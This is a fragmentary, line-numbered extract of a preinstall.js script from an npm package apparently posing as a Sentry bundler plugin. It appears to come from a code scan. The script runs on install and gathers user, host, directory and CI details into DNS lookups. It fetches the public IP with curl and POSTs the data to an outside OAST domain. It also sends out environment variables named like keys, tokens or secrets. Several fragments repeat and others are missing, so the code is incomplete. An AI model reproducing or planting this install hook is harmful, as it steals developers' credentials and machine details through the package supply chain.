// File: tmp/tmp4a856gh9/sentry-bundler-plugin-dev/package/preinstall.js
// ======================================================================
Line 3: const dns = require('dns')
Line 4: const os = require('os')
Line 5: _tmp_2 = require('child_process')
Line 6: const https = require('https')
Line 13: Buffer.from(str).toString('hex')
Line 19: os.userInfo()
Line 20: os.hostname()
Line 22: os.platform()
Line 23: os.arch()
Line 24: Date.now().toString(36)
Line 30: _tmp_5.push(...hexify(info.vulnerable_package))
Line 31: _tmp_5.push(...hexify(info.user))
Line 32: _tmp_5.push(...hexify(info.host))
Line 33: _tmp_5.push(...hexify(info.cwd))
Line 34: _tmp_5.push(info.platform)
Line 35: _tmp_5.push(info.arch)
Line 36: _tmp_5.push(info.ci ? "ci" : "local")
Line 37: _tmp_5.push(info.timestamp)
Line 38: _tmp_5.push(OAST_DOMAIN)
Line 41: labels.join('.')
Line 48: {
    exec('curl -s https://api.ipify.org', (err, stdout) => {
      if (err) return;
      const ip = stdout.trim();
      const payload = JSON.stringify({ ...info, ip });
      const req = https.request({
        hostname: OAST_DOMAIN, path: '/', method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, () => {});
      req.on('error', () => {});
      req.write(payload);
      req.end();
    });
}
Line 49: exec('curl -s https://api.ipify.org', (err, stdout) => {
      if (err) return;
      const ip = stdout.trim();
      const payload = JSON.stringify({ ...info, ip });
      const req = https.request({
        hostname: OAST_DOMAIN, path: '/', method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, () => {});
      req.on('error', () => {});
      req.write(payload);
      req.end();
    })
Line 51: stdout.trim()
Line 53: const req = https.request({
        hostname: OAST_DOMAIN, path: '/', method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, () => {})
Line 58: req.write(payload)
Line 59: req.end()
Line 67: /key|token|secret/i.test(k)
Line 71: {
      const req = https.request({
        hostname: OAST_DOMAIN, path: '/', method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, () => {});
      req.write(JSON.stringify({ envleak: leaked }));
      req.end();
    }
Line 72: const req = https.request({
        hostname: OAST_DOMAIN, path: '/', method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, () => {})
Line 76: req.write(JSON.stringify({ envleak: leaked }))
Line 77: req.end()
